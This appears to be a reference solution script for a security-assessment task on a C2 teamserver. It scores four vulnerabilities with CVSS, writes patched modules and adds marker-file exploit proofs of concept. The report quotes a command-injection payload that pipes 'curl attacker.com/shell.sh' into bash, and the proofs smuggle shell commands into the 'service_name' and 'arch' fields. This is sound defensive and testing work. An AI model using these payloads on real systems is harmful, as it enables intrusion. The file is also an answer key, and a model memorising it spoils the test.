#!/usr/bin/env python3

"""
Solution for C2 Teamserver Security Assessment with Custom Static Analysis.

1. Run bandit for automated baseline
2. Install custom AST-based scanner
3. Create assessment report with CVSS 3.1 scoring
4. Write exploit proof-of-concept scripts
5. Write patched module files
"""

import os
import json
import subprocess
import math
import shutil

# ============================================================
# 1. Run Bandit Baseline
# ============================================================

print("[+] Running bandit baseline scan...")
bandit_result = subprocess.run(
    ['bandit', '-r', '/app/teamserver/', '-f', 'json'],
    capture_output=True, text=True
)
with open('/app/bandit_baseline.json', 'w') as f:
    f.write(bandit_result.stdout if bandit_result.stdout.strip() else
            '{"results": [], "errors": []}')
print("[+] Bandit baseline saved to /app/bandit_baseline.json")

# Parse bandit results for assessment
try:
    bandit_data = json.loads(bandit_result.stdout)
    bandit_total = len(bandit_data.get('results', []))
    bandit_high = len([r for r in bandit_data.get('results', [])
                       if r.get('issue_severity', '') in ('HIGH', 'MEDIUM')])
except (json.JSONDecodeError, TypeError):
    bandit_total = 0
    bandit_high = 0

# ============================================================
# 2. Install Custom Scanner
# ============================================================

print("[+] Installing custom AST-based vulnerability scanner...")
os.makedirs('/app/scanner', exist_ok=True)
shutil.copy('/solution/scanner_code.py', '/app/scanner/vuln_scanner.py')
print("[+] Scanner installed at /app/scanner/vuln_scanner.py")

# ============================================================
# 3. Create Assessment Report
# ============================================================

print("[+] Creating security assessment with CVSS scoring...")


def roundup(x):
    return math.ceil(x * 10) / 10


def compute_cvss(av, ac, pr, ui, s, c, i, a):
    av_vals = {'N': 0.85, 'A': 0.62, 'L': 0.55, 'P': 0.20}
    ac_vals = {'L': 0.77, 'H': 0.44}
    ui_vals = {'N': 0.85, 'R': 0.62}
    cia_vals = {'H': 0.56, 'L': 0.22, 'N': 0.0}
    scope_changed = s == 'C'
    pr_vals = ({'N': 0.85, 'L': 0.68, 'H': 0.50} if scope_changed
               else {'N': 0.85, 'L': 0.62, 'H': 0.27})
    exploitability = 8.22 * av_vals[av] * ac_vals[ac] * pr_vals[pr] * ui_vals[ui]
    iss = 1 - ((1 - cia_vals[c]) * (1 - cia_vals[i]) * (1 - cia_vals[a]))
    if iss <= 0:
        return 0.0
    if scope_changed:
        impact = 7.52 * (iss - 0.029) - 3.25 * ((iss - 0.02) ** 15)
    else:
        impact = 6.42 * iss
    if impact <= 0:
        return 0.0
    if scope_changed:
        return roundup(min(1.08 * (impact + exploitability), 10))
    return roundup(min(impact + exploitability, 10))


# Define vulnerabilities with CVSS vectors
vuln_defs = [
    {
        "id": 1,
        "cwe_id": "CWE-287",
        "title": "Authentication Bypass via Implicit None Return",
        "affected_file": "teamserver/auth.py",
        "affected_function": "ServiceAuthenticator.authenticate",
        "vector": ("N", "L", "N", "N", "U", "H", "H", "N"),
        "description": (
            "ServiceAuthenticator.authenticate() implicitly returns None when "
            "a username is not found in the service accounts list (no explicit "
            "return statement at end of method). The caller in app.py uses "
            "'if result is not False:' to check authentication, which passes "
            "for None since None is not False. Any request with an unknown "
            "username bypasses authentication and receives a valid session token."
        ),
        "root_cause": (
            "Missing explicit 'return False' at end of authenticate() method. "
            "Python functions implicitly return None when control falls off "
            "the end, and the caller's identity check 'is not False' treats "
            "None as a successful authentication."
        ),
        "detection_method": "manual"
    },
    {
        "id": 2,
        "cwe_id": "CWE-78",
        "title": "OS Command Injection via Unsanitized Service Name",
        "affected_file": "teamserver/builder.py",
        "affected_function": "AgentBuilder.build",
        "vector": ("N", "L", "L", "N", "U", "H", "H", "H"),
        "description": (
            "The build() method sanitizes most configuration parameters with "
            "shlex.quote() before interpolating into a shell command, but the "
            "'service_name' field is manually wrapped in literal double quotes "
            "('-DSERVICE_NAME=\"{service_name}\"') without sanitization. An "
            "attacker can escape the quotes and inject arbitrary commands."
        ),
        "root_cause": (
            "Inconsistent input sanitization: service_name uses manual "
            "double-quote wrapping instead of shlex.quote(), unlike all other "
            "interpolated parameters in the same command."
        ),
        "detection_method": "manual"
    },
    {
        "id": 3,
        "cwe_id": "CWE-22",
        "title": "Path Traversal via Incomplete Component Validation",
        "affected_file": "teamserver/handlers.py",
        "affected_function": "LootHandler.store_download",
        "vector": ("N", "L", "N", "N", "U", "N", "H", "N"),
        "description": (
            "store_download() strips leading slashes and checks whether the "
            "first path component is '..' but does not check subsequent "
            "components. A path like 'dummy/../../../../etc/passwd' passes "
            "the first-component check (first is 'dummy') but traverses "
            "outside the loot directory via interior '..' components."
        ),
        "root_cause": (
            "Incomplete path validation: only the first component of the path "
            "is checked for '..', but path traversal can occur through any "
            "component. Should use os.path.realpath() and verify the resolved "
            "path remains under the intended directory."
        ),
        "detection_method": "manual"
    },
    {
        "id": 4,
        "cwe_id": "CWE-78",
        "title": "OS Command Injection via Dict.get Identity Fallback",
        "affected_file": "teamserver/modules.py",
        "affected_function": "ModuleCompiler.compile_module",
        "vector": ("N", "L", "N", "N", "U", "H", "H", "H"),
        "description": (
            "compile_module() uses ARCH_MAP.get(arch, arch) to resolve the "
            "architecture string, falling back to the raw beacon-provided "
            "'arch' value if not in the map. This raw value is interpolated "
            "into a shell command without shlex.quote(). Since arch comes "
            "from beacon registration data (attacker-controlled), a malicious "
            "beacon can register with an arch value like "
            "'x64; curl attacker.com/shell.sh | bash; #' for RCE."
        ),
        "root_cause": (
            "Unsafe dict.get() fallback pattern: ARCH_MAP.get(arch, arch) "
            "passes untrusted input through when the key is not found. "
            "Unknown architectures should be rejected, not passed through."
        ),
        "detection_method": "manual"
    }
]

# Compute CVSS scores
for v in vuln_defs:
    av, ac, pr, ui, s, c, i, a = v["vector"]
    score = compute_cvss(av, ac, pr, ui, s, c, i, a)
    vector_str = f"CVSS:3.1/AV:{av}/AC:{ac}/PR:{pr}/UI:{ui}/S:{s}/C:{c}/I:{i}/A:{a}"

    if score >= 9.0:
        rating = "critical"
    elif score >= 7.0:
        rating = "high"
    elif score >= 4.0:
        rating = "medium"
    else:
        rating = "low"

    v["cvss_vector"] = vector_str
    v["cvss_score"] = score
    v["severity_rating"] = rating
    del v["vector"]

assessment = {
    "automated_baseline": {
        "tool": "bandit",
        "total_findings": bandit_total,
        "high_severity_count": bandit_high,
        "coverage_gaps": (
            "Bandit detects subprocess.run() with shell=True (B602/B603) as a "
            "generic risk, but cannot distinguish between sanitized and "
            "unsanitized parameters within the same shell command. It misses: "
            "(1) The auth bypass — a semantic logic bug where implicit None "
            "return interacts with a caller's 'is not False' check, which is "
            "beyond pattern-based analysis. (2) The specific unsanitized field "
            "in builder.py — bandit flags shell=True generically but cannot "
            "determine that service_name lacks shlex.quote while other fields "
            "are sanitized. (3) The incomplete path traversal — bandit has no "
            "rule for checking whether os.path.join inputs are validated "
            "with realpath(). (4) The dict.get identity fallback — "
            "ARCH_MAP.get(arch, arch) is a subtle data-flow pattern where "
            "the fallback IS the untrusted input, invisible to pattern matchers."
        )
    },
    "vulnerabilities": vuln_defs,
    "attack_chains": [
        {
            "chain_id": 1,
            "name": "Unauthenticated RCE via Auth Bypass + Builder Injection",
            "vulnerability_sequence": [1, 2],
            "combined_impact": (
                "An unauthenticated attacker exploits the service auth bypass "
                "(vuln 1) to obtain a valid session token without credentials. "
                "With this token, they call the agent build endpoint with a "
                "malicious service_name (vuln 2) to achieve arbitrary command "
                "execution on the teamserver. Combined: unauthenticated remote "
                "code execution on the C2 infrastructure."
            ),
            "likelihood": "high"
        },
        {
            "chain_id": 2,
            "name": "Beacon-to-Teamserver Takeover via Traversal + Injection",
            "vulnerability_sequence": [3, 4],
            "combined_impact": (
                "A malicious beacon uses the path traversal (vuln 3) to "
                "overwrite teamserver files (e.g., module Makefiles or Python "
                "source). Alternatively, the beacon registers with a crafted "
                "arch value (vuln 4) that executes arbitrary commands when an "
                "operator compiles a module. Either path gives the adversary "
                "persistent code execution on the teamserver from a beacon, "
                "turning a compromised target into an attack on the red team "
                "infrastructure itself."
            ),
            "likelihood": "medium"
        }
    ],
    "remediation_priority": [4, 1, 2, 3]
}

with open('/app/assessment.json', 'w') as f:
    json.dump(assessment, f, indent=2)
print("[+] Assessment saved to /app/assessment.json")

# ============================================================
# 4. Create Patched Files
# ============================================================

print("[+] Creating patched module files...")
os.makedirs('/app/patched', exist_ok=True)

# --- Patched auth.py ---
PATCHED_AUTH = '''\
"""
Authentication module for C2 teamserver.
Patched: ServiceAuthenticator.authenticate now returns False for unknown users.
"""

import hashlib
import hmac
import time
import secrets
import logging

logger = logging.getLogger(__name__)


class SessionManager:
    """Manages authenticated sessions with expiry and revocation."""

    def __init__(self, session_timeout=3600):
        self._sessions = {}
        self._timeout = session_timeout

    def create_session(self, username, role='operator'):
        token = secrets.token_hex(32)
        self._sessions[token] = {
            'username': username,
            'role': role,
            'created': time.time(),
            'last_active': time.time()
        }
        return token

    def validate_session(self, token):
        session = self._sessions.get(token)
        if session is None:
            return None
        if time.time() - session['created'] > self._timeout:
            del self._sessions[token]
            return None
        session['last_active'] = time.time()
        return session

    def revoke_session(self, token):
        self._sessions.pop(token, None)


class OperatorAuthenticator:
    """Authenticates operator login requests."""

    def __init__(self, operators):
        self.operators = operators
        self._failed_attempts = {}
        self._lockout_threshold = 5
        self._lockout_duration = 300

    def authenticate(self, username, password):
        if not username or not password:
            return False

        attempts = self._failed_attempts.get(username, {'count': 0, 'last': 0})
        if (attempts['count'] >= self._lockout_threshold and
                (time.time() - attempts['last']) < self._lockout_duration):
            logger.warning(f"Account locked out: {username}")
            return False

        password_hash = hashlib.sha256(password.encode()).hexdigest()

        for operator in self.operators:
            if operator['username'] == username:
                if hmac.compare_digest(operator['password_hash'], password_hash):
                    self._failed_attempts.pop(username, None)
                    return {
                        'authenticated': True,
                        'username': username,
                        'role': operator.get('role', 'operator')
                    }
                else:
                    self._failed_attempts[username] = {
                        'count': attempts['count'] + 1,
                        'last': time.time()
                    }
                    return False

        return False


class ServiceAuthenticator:
    """Authenticates service API requests."""

    def __init__(self, service_accounts):
        self.service_accounts = service_accounts

    def authenticate(self, username, password):
        if not username or not password:
            return False

        password_hash = hashlib.sha256(password.encode()).hexdigest()

        for account in self.service_accounts:
            if account['username'] == username:
                if hmac.compare_digest(account['password_hash'], password_hash):
                    return {
                        'authenticated': True,
                        'username': username,
                        'role': account.get('role', 'service')
                    }
                else:
                    return False

        # FIX: Explicitly return False when username is not found
        return False
'''

with open('/app/patched/auth.py', 'w') as f:
    f.write(PATCHED_AUTH)

# --- Patched builder.py ---
PATCHED_BUILDER = '''\
"""
Agent builder module for C2 teamserver.
Patched: service_name is now sanitized with shlex.quote().
"""

import subprocess
import shlex
import os
import json
import hashlib
import logging

logger = logging.getLogger(__name__)


class AgentBuilder:
    """Builds agent binaries for target deployment."""

    VALID_ARCHS = {'x86', 'x64', 'arm', 'arm64'}
    VALID_FORMATS = {'exe', 'dll', 'shellcode', 'elf', 'macho'}
    VALID_PROTOCOLS = {'https', 'dns', 'mtls', 'wg'}

    def __init__(self, template_dir='/app/templates', output_dir='/app/output'):
        self.template_dir = template_dir
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)

    def _validate_arch(self, arch):
        if arch not in self.VALID_ARCHS:
            raise ValueError(f"Invalid architecture: {arch}")
        return arch

    def _validate_format(self, fmt):
        if fmt not in self.VALID_FORMATS:
            raise ValueError(f"Invalid format: {fmt}")
        return fmt

    def _validate_protocol(self, protocol):
        if protocol not in self.VALID_PROTOCOLS:
            raise ValueError(f"Invalid protocol: {protocol}")
        return protocol

    def _sanitize_string(self, value):
        return shlex.quote(str(value))

    def _generate_build_id(self, config):
        config_str = json.dumps(config, sort_keys=True)
        return hashlib.md5(config_str.encode()).hexdigest()[:12]

    def build(self, config):
        arch = self._validate_arch(config.get('arch', 'x64'))
        fmt = self._validate_format(config.get('format', 'exe'))
        protocol = self._validate_protocol(config.get('protocol', 'https'))

        listener = self._sanitize_string(config.get('listener', 'default'))
        callback_host = self._sanitize_string(config.get('callback_host', '127.0.0.1'))
        callback_port = self._sanitize_string(str(config.get('callback_port', 443)))
        sleep_time = self._sanitize_string(str(config.get('sleep', 10)))
        jitter = self._sanitize_string(str(config.get('jitter', 0)))

        # FIX: Sanitize service_name with shlex.quote
        service_name = self._sanitize_string(config.get('service_name', 'UpdateService'))

        build_id = self._generate_build_id(config)
        output_path = os.path.join(self.output_dir, f"agent_{build_id}.{fmt}")

        if fmt in ('exe', 'dll'):
            compiler = 'x86_64-w64-mingw32-gcc' if arch == 'x64' else 'i686-w64-mingw32-gcc'
        else:
            compiler = 'gcc'

        template_file = os.path.join(self.template_dir, 'agent.c')

        cmd = (
            f"{compiler} -o {shlex.quote(output_path)} "
            f"-DCALLBACK_HOST={callback_host} "
            f"-DCALLBACK_PORT={callback_port} "
            f"-DPROTOCOL={self._sanitize_string(protocol)} "
            f"-DSLEEP_TIME={sleep_time} "
            f"-DJITTER={jitter} "
            f"-DSERVICE_NAME={service_name} "
            f"-DBUILD_ID={self._sanitize_string(build_id)} "
            f"{shlex.quote(template_file)}"
        )

        logger.info(f"Building agent {build_id} for {arch}/{fmt}")

        result = subprocess.run(
            cmd, shell=True,
            capture_output=True, text=True,
            timeout=120
        )

        return {
            'success': result.returncode == 0,
            'output_path': output_path,
            'build_id': build_id,
            'stdout': result.stdout,
            'stderr': result.stderr
        }

    def list_builds(self):
        builds = []
        if os.path.exists(self.output_dir):
            for f in os.listdir(self.output_dir):
                fpath = os.path.join(self.output_dir, f)
                builds.append({
                    'filename': f,
                    'path': fpath,
                    'size': os.path.getsize(fpath)
                })
        return builds
'''

with open('/app/patched/builder.py', 'w') as f:
    f.write(PATCHED_BUILDER)

# --- Patched handlers.py ---
PATCHED_HANDLERS = '''\
"""
File and loot handling module for C2 teamserver.
Patched: store_download validates resolved path stays within loot directory.
"""

import os
import hashlib
import time
import re
import logging

logger = logging.getLogger(__name__)


class LootHandler:
    """Handles storage and indexing of loot from target systems."""

    def __init__(self, loot_dir='/app/data/loot'):
        self.loot_dir = loot_dir
        self._loot_index = []
        os.makedirs(loot_dir, exist_ok=True)

    def _sanitize_filename(self, filename):
        safe_name = os.path.basename(filename)
        safe_name = safe_name.replace('\\x00', '')
        safe_name = re.sub(r'[^\\w.\\-]', '_', safe_name)
        if not safe_name:
            safe_name = 'unnamed_file'
        return safe_name

    def store_loot(self, beacon_id, filename, data):
        safe_name = self._sanitize_filename(filename)
        beacon_dir = os.path.join(self.loot_dir, str(beacon_id))
        os.makedirs(beacon_dir, exist_ok=True)
        filepath = os.path.join(beacon_dir, safe_name)
        with open(filepath, 'wb') as f:
            f.write(data)
        file_hash = hashlib.sha256(data).hexdigest()
        entry = {
            'beacon_id': str(beacon_id),
            'filename': safe_name,
            'original_name': filename,
            'path': filepath,
            'hash': file_hash,
            'size': len(data),
            'timestamp': time.time()
        }
        self._loot_index.append(entry)
        return entry

    def store_download(self, beacon_id, filepath, data):
        target_dir = os.path.join(self.loot_dir, str(beacon_id), 'downloads')
        os.makedirs(target_dir, exist_ok=True)

        clean_path = filepath.replace('\\x00', '')
        clean_path = clean_path.replace('\\\\', '/')
        clean_path = clean_path.lstrip('/')

        if not clean_path:
            raise ValueError("Empty filepath")

        # FIX: Resolve full path and verify it stays within target_dir
        full_path = os.path.join(target_dir, clean_path)
        resolved_path = os.path.realpath(full_path)
        resolved_target = os.path.realpath(target_dir)

        if not resolved_path.startswith(resolved_target + os.sep) and \\
           resolved_path != resolved_target:
            raise ValueError("Path traversal detected: path escapes loot directory")

        os.makedirs(os.path.dirname(resolved_path), exist_ok=True)

        with open(resolved_path, 'wb') as f:
            f.write(data)

        file_hash = hashlib.sha256(data).hexdigest()
        entry = {
            'beacon_id': str(beacon_id),
            'original_path': filepath,
            'stored_path': resolved_path,
            'hash': file_hash,
            'size': len(data),
            'timestamp': time.time()
        }
        self._loot_index.append(entry)
        return entry

    def get_loot_index(self):
        return list(self._loot_index)

    def get_loot_by_beacon(self, beacon_id):
        return [e for e in self._loot_index if e['beacon_id'] == str(beacon_id)]
'''

with open('/app/patched/handlers.py', 'w') as f:
    f.write(PATCHED_HANDLERS)

# --- Patched modules.py ---
PATCHED_MODULES = '''\
"""
Module compiler for C2 teamserver.
Patched: Unknown architectures are rejected instead of using raw fallback.
"""

import subprocess
import shlex
import os
import re
import logging

logger = logging.getLogger(__name__)


class ModuleCompiler:
    """Compiles post-exploitation modules for beacon targets."""

    ARCH_MAP = {
        'x86': 'i686',
        'x64': 'x86_64',
        'arm': 'armv7',
        'arm64': 'aarch64'
    }

    AVAILABLE_MODULES = {
        'migrate', 'inject', 'keylog', 'screenshot',
        'hashdump', 'portscan', 'socks', 'upload'
    }

    def __init__(self, modules_dir='/app/modules'):
        self.modules_dir = modules_dir

    def _validate_module(self, module_name):
        if not re.fullmatch(r'[a-zA-Z0-9_]+', module_name):
            raise ValueError(f"Invalid module name format: {module_name}")
        if module_name not in self.AVAILABLE_MODULES:
            raise ValueError(f"Unknown module: {module_name}")
        return module_name

    def compile_module(self, module_name, beacon_info):
        module_name = self._validate_module(module_name)

        arch = beacon_info.get('arch', 'x64')
        os_type = beacon_info.get('os', 'windows')
        target_pid = beacon_info.get('pid', '0')

        # FIX: Reject unknown architectures instead of using raw value
        if arch not in self.ARCH_MAP:
            raise ValueError(f"Invalid architecture: {arch}")
        compiler_arch = self.ARCH_MAP[arch]

        safe_os = shlex.quote(os_type)
        safe_pid = shlex.quote(str(target_pid))

        build_dir = os.path.join(self.modules_dir, module_name)

        cmd = (
            f"make -C {shlex.quote(build_dir)} "
            f"ARCH={compiler_arch} "
            f"TARGET_OS={safe_os} "
            f"TARGET_PID={safe_pid} "
            f"all"
        )

        logger.info(f"Compiling module {module_name} for arch={arch} os={os_type}")

        try:
            result = subprocess.run(
                cmd, shell=True,
                capture_output=True, text=True,
                timeout=60
            )

            return {
                'success': result.returncode == 0,
                'module': module_name,
                'output': result.stdout,
                'errors': result.stderr
            }
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'module': module_name,
                'output': '',
                'errors': 'Build timed out'
            }
'''

with open('/app/patched/modules.py', 'w') as f:
    f.write(PATCHED_MODULES)

print("[+] Patched files created in /app/patched/")

# ============================================================
# 5. Create Exploit Scripts
# ============================================================

print("[+] Creating exploit proof-of-concept scripts...")
os.makedirs('/app/exploits', exist_ok=True)

# --- Exploit 1: Auth Bypass ---
EXPLOIT_AUTH = '''\
#!/usr/bin/env python3
"""Exploit: Authentication bypass in ServiceAuthenticator (CWE-287)."""
import sys
import hashlib

sys.path.insert(0, '/app')
from teamserver.auth import ServiceAuthenticator

accounts = [{
    'username': 'svc_test',
    'password_hash': hashlib.sha256(b'test_password').hexdigest(),
    'role': 'service'
}]

auth = ServiceAuthenticator(accounts)
result = auth.authenticate('nonexistent_user', 'any_password')

if result is None and result is not False:
    print("[+] AUTH BYPASS: Unknown user passes 'is not False' check")
    print(f"    result = {result!r} (type: {type(result).__name__})")
    sys.exit(0)
else:
    print("[-] EXPLOIT FAILED: auth bypass not present")
    sys.exit(1)
'''

with open('/app/exploits/exploit_1_auth_bypass.py', 'w') as f:
    f.write(EXPLOIT_AUTH)

# --- Exploit 2: Builder Command Injection ---
EXPLOIT_BUILDER = '''\
#!/usr/bin/env python3
"""Exploit: Command injection in AgentBuilder.build() (CWE-78)."""
import sys
import os

sys.path.insert(0, '/app')
from teamserver.builder import AgentBuilder

marker = '/tmp/exploit_builder_marker'
if os.path.exists(marker):
    os.remove(marker)

builder = AgentBuilder(
    template_dir='/app/templates',
    output_dir='/tmp/exploit_builder_out'
)

config = {
    'arch': 'x64', 'format': 'exe', 'protocol': 'https',
    'service_name': f'" -x; touch {marker}; #',
    'callback_host': '127.0.0.1', 'callback_port': 443,
}

try:
    builder.build(config)
except Exception:
    pass

if os.path.exists(marker):
    print(f"[+] COMMAND INJECTION: Marker file created at {marker}")
    os.remove(marker)
    sys.exit(0)
else:
    print("[-] EXPLOIT FAILED: command injection did not work")
    sys.exit(1)
'''

with open('/app/exploits/exploit_2_builder_injection.py', 'w') as f:
    f.write(EXPLOIT_BUILDER)

# --- Exploit 3: Path Traversal ---
EXPLOIT_TRAVERSAL = '''\
#!/usr/bin/env python3
"""Exploit: Path traversal in LootHandler.store_download() (CWE-22)."""
import sys
import os
import tempfile

sys.path.insert(0, '/app')
from teamserver.handlers import LootHandler

with tempfile.TemporaryDirectory() as tmpdir:
    loot_dir = os.path.join(tmpdir, 'loot')
    handler = LootHandler(loot_dir=loot_dir)

    marker_path = os.path.join(tmpdir, 'traversal_marker')
    exploit_path = 'dummy/../../../../traversal_marker'

    handler.store_download('beacon1', exploit_path, b'path_traversal_success')

    if os.path.exists(marker_path):
        print("[+] PATH TRAVERSAL: File written outside loot directory")
        print(f"    Intended: {loot_dir}/beacon1/downloads/")
        print(f"    Actual:   {marker_path}")
        sys.exit(0)
    else:
        print("[-] EXPLOIT FAILED: path traversal did not work")
        sys.exit(1)
'''

with open('/app/exploits/exploit_3_path_traversal.py', 'w') as f:
    f.write(EXPLOIT_TRAVERSAL)

# --- Exploit 4: Modules Command Injection ---
EXPLOIT_MODULES = '''\
#!/usr/bin/env python3
"""Exploit: Command injection in ModuleCompiler.compile_module() (CWE-78)."""
import sys
import os

sys.path.insert(0, '/app')
from teamserver.modules import ModuleCompiler

marker = '/tmp/exploit_modules_marker'
if os.path.exists(marker):
    os.remove(marker)

compiler = ModuleCompiler(modules_dir='/app/modules')

beacon_info = {
    'arch': f'x64; touch {marker}; #',
    'os': 'windows'
}

try:
    compiler.compile_module('migrate', beacon_info)
except Exception:
    pass

if os.path.exists(marker):
    print(f"[+] COMMAND INJECTION: Marker file created at {marker}")
    os.remove(marker)
    sys.exit(0)
else:
    print("[-] EXPLOIT FAILED: command injection did not work")
    sys.exit(1)
'''

with open('/app/exploits/exploit_4_modules_injection.py', 'w') as f:
    f.write(EXPLOIT_MODULES)

print("[+] Created 4 exploit scripts in /app/exploits/")
print("[+] Solution complete")
